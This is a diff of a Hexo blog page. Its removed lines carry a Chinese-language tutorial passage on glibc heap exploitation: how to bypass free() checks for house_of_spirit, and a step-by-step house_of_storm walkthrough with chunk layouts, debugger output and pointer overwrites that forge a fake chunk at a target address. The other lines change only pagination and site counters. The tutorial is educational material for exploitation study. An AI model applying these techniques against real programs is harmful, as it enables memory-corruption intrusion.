-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">			     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">	   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">	   after getting the lock.  */</span></span><br><span class="line">	<span class="keyword">if</span> (have_lock</span><br><span class="line">	    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">		  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">		  locked = <span class="number">1</span>;</span><br><span class="line">		  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">	      &#125;))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="keyword">if</span> (! have_lock)</span><br><span class="line">	  &#123;</span><br><span class="line">	    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">	    locked = <span class="number">0</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
-<ol start="5">
-<li>检查fastbin的第一个chunk是否是当前释放的chunk，防止double free。源码如下：</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">	   (i.e., double free).  */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">	   size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">	   only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">	   deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">	<span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">	  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">	p-&gt;fd = old2 = old;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br></pre></td></tr></table></figure>
-<p>在house_of_spirit中，第2个检查一般都是满足的，绕过第1个检查需要将目标地址看做一个chunk，对应size的地址处应该写入一个0x20~0x80且能够被0x8整除的数，以绕过第1, 3个检查。第4个检查的绕过需要一些小技巧。假设在目标地址处我们可以控制0x60的空间，那么我们的size不应该写成0x60而是小于0x60，这样方便我们在后面伪造next chunk的size。第5个检查一般没有问题。</p>
-<p>所有这些工作做好之后，就可以先释放再分配了。分配完成后就可以在目标地址处获取一个chunk。一般来说house_of_spirit是作为跳板来使用的，在目标地址获取chunk能够很好地为其他攻击手段做准备。</p>
-<h1 id="11-house_of_storm"><a class="markdownIt-Anchor" href="#11-house_of_storm"></a> 11. house_of_storm</h1>
-<p>关于此利用方式，源码中的说明是可以向用户返回任意一个chunk。</p>
-<p>首先，程序分配了两个chunk，一个进入unsorted bin，一个进入large bins，且unsorted bin中的chunk大小大于large bins中的chunk。在源码中，unsorted bin chunk的大小设定为0x4f0，同时分配一个小chunk防止其在释放时与top chunk合并。</p>
-<p>之后，源码中以这个chunk的最高非0字节为参考，计算了需要分配的chunk的大小。将最低1bit置0（因为这里在chunk的size中代表的是prev_in_use标志位），这里需要进行检查：最低1字节的bit-3不能为1，若bit-2为1则bit-1不能为0，至于原因，后面会提到。</p>
-<p>如果上述检查通过，则进行接下来的操作。分配一个大小为0x4e0的chunk，再加上一个小chunk防止与top chunk合并。之后释放0x4e0大小的chunk和0x4f0大小的chunk（这里注意要首先释放较小的chunk），然后分配一个0x4f0大小的chunk。这样由于<font color=red><strong>unsorted bin在malloc时遵循先进先出的队列结构</strong></font>，会首先检查到小chunk，而小chunk大小不足，会被链入到large bins中。然后再将0x4f0大小的chunk释放，返还到unsorted bin中，bins的环境就构造完成了。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x603000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x4c0: 0x603510 —▸ 0x7ffff7dd1f98 (main_arena+1144) ◂— 0x603510</span><br></pre></td></tr></table></figure>
-<p>然后，我们需要使用unsorted bin attack，覆盖unsorted bin chunk的bk指针为(目标地址 - 0x10)处，覆盖large bin chunk的bk指针到(目标地址 - 0x8)处，覆盖large bin chunk的bk_nextsize。之后，malloc即可获取目标地址的chunk。</p>
-<p>但是，为什么会这样呢？这需要从_int_malloc函数中寻找答案。</p>
-<h2 id="本漏洞利用中_int_malloc函数中重要步骤"><a class="markdownIt-Anchor" href="#本漏洞利用中_int_malloc函数中重要步骤"></a> 本漏洞利用中_int_malloc函数中重要步骤：</h2>
-<p>参考博客（有分析全过程）：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453285/article/details/99005759?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164652688616780265470085%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164652688616780265470085&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-99005759.pc_search_result_control_group&amp;utm_term=int_malloc&amp;spm=1018.2226.3001.4187">_int_malloc函数详解</a></p>
-<ol>
-<li>
-<p>如果申请大小在fastbin范围则从fastbin中查找是否有合适的chunk。</p>
-</li>
-<li>
-<p>如果申请大小在small bins范围则从small bins中查找是否有合适的chunk。</p>
-</li>
-<li>
-<p>前2步没有找到调用malloc_consolidate函数整理堆块</p>
-</li>
-<li>
-<p>大循环：</p>
-<p>(1) 从unsorted bin中获取当前遍历到的chunk<br />
-(2) 如果申请大小在small bins范围且last remainder可以切割一部分给申请堆块，则切割后返回<br />
-(3) 如果申请大小正好等于当前遍历到chunk的大小，则直接返回<br />
-<font color=red><br />
-(4) 将当前unsorted bin chunk放入small bins或large bins中：<br />
-如果当前遍历到的unsorted bin chunk的大小属于small bins范围则放入对应的small bin中。<br />
-如果属于large bins范围，则需要进行一些处理：<br />
-因为large bins中的每一个bin里面的chunk大小均是一个范围值而不是固定值，所以libc会对每一个large bin中的chunk按照大小进行排序，large bin chunk的fd和bk指针指向前后chunk，而fd_nextsize和bk_nextsize指向前后第一个与该chunk大小不同的chunk，便于遍历。所以，libc会遍历该large bin并将这个原本在unsorted bin中的chunk放入正确的位置。在house of storm中，至关重要的就是下面的入链操作：<br />
-</font></p>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
-<p>这里要尤其注意第4条语句，这是唯一一条修改目标地址值的语句。<br />
-（victim = unsorted bin chunk，fwd = large bin chunk）</p>
-<p>在此之前，分别位于unsorted bin和large bins的两个chunk的构造如下：</p>
-<p>unsorted bin chunk:</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">addr</th>
-<th style="text-align:center">+0x0</th>
-<th style="text-align:center">+0x8</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">0x603000</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x4f1(size)</td>
-</tr>
-<tr>
-<td style="text-align:center">0x603010</td>
-<td style="text-align:center">main_arena + 0x68</td>
-<td style="text-align:center">target-0x10</td>
-</tr>
-<tr>
-<td style="text-align:center">0x603020</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-</tr>
-</tbody>
-</table>
-<p>large bin chunk:</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">addr</th>
-<th style="text-align:center">+0x0</th>
-<th style="text-align:center">+0x8</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">0x603510</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x4e1(size)</td>
-</tr>
-<tr>
-<td style="text-align:center">0x603520</td>
-<td style="text-align:center">main_arena + 1144</td>
-<td style="text-align:center">target-0x8</td>
-</tr>
-<tr>
-<td style="text-align:center">0x603530</td>
-<td style="text-align:center">0x603510(fd_nextsize)</td>
-<td style="text-align:center">target-0x2a(bk_nextsize)</td>
-</tr>
-</tbody>
-</table>
-<p>在执行完上述4步之后，结构变为：</p>
-<p>unsorted bin chunk:</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">addr</th>
-<th style="text-align:center">+0x0</th>
-<th style="text-align:center">+0x8</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">0x603000</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x4f1(size)</td>
-</tr>
-<tr>
-<td style="text-align:center">0x603010</td>
-<td style="text-align:center">main_arena + 0x68</td>
-<td style="text-align:center">target-0x8</td>
-</tr>
-<tr>
-<td style="text-align:center">0x603020</td>
-<td style="text-align:center"><font color=red>0x603510</font></td>
-<td style="text-align:center"><font color=red>target-0x2a</font></td>
-</tr>
-</tbody>
-</table>
-<p>large bin chunk:</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">addr</th>
-<th style="text-align:center">+0x0</th>
-<th style="text-align:center">+0x8</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">0x603510</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x4e1(size)</td>
-</tr>
-<tr>
-<td style="text-align:center">0x603520</td>
-<td style="text-align:center">main_arena + 1144</td>
-<td style="text-align:center">target-0x8</td>
-</tr>
-<tr>
-<td style="text-align:center">0x603530</td>
-<td style="text-align:center">0x603510</td>
-<td style="text-align:center"><font color=red>0x603000</font></td>
-</tr>
-</tbody>
-</table>
-<p>同时(target-0x2a)-&gt;fd_nextsize被写入为0x603000，也即target-0xa处被写入为0x603000：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">addr</th>
-<th style="text-align:center">0</th>
-<th style="text-align:center">1</th>
-<th style="text-align:center">2</th>
-<th style="text-align:center">3</th>
-<th style="text-align:center">4</th>
-<th style="text-align:center">5</th>
-<th style="text-align:center">6</th>
-<th style="text-align:center">7</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">target-0x10</td>
-<td style="text-align:center">–</td>
-<td style="text-align:center">–</td>
-<td style="text-align:center">–</td>
-<td style="text-align:center">–</td>
-<td style="text-align:center">–</td>
-<td style="text-align:center">–</td>
-<td style="text-align:center"><font color=red>00</font></td>
-<td style="text-align:center"><font color=red>30</font></td>
-</tr>
-<tr>
-<td style="text-align:center">target-0x8</td>
-<td style="text-align:center"><font color=red>60</font></td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-</tr>
-<tr>
-<td style="text-align:center">target</td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-</tr>
-<tr>
-<td style="text-align:center">target+0x8</td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-</tr>
-</tbody>
-</table>
-<p>如果将target-0x10看做chunk头，那么这里正好写入了一个正确的size，即0x60！这也就能够解释为什么源代码一开始要将unsorted bin chunk地址的高位作为size，且需要通过一系列检查了。通过了一系列检查，然后像这样错位写入，就正好能够伪造正确的size！这样，_int_malloc函数就能够为我们返回这个地方的地址了。</p>
-<p>对于这个漏洞的利用的理解需要对_int_malloc函数有充分的理解，利用unsorted bin chunk被链入到large bins的过程对堆结构进行攻击。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/11/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/13/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/11/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/13/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -2496,7 +2186,7 @@ fastbin的重新分配会进行一个检查：后面一个fastbin的大小是否
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">140</span>
+          <span class="site-state-item-count">141</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2548,13 +2238,13 @@ fastbin的重新分配会进行一个检查：后面一个fastbin的大小是否
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">1.2m</span>
+    <span title="Symbols count total">1.3m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">18:50</span>
+    <span title="Reading time total">18:57</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
   </div>
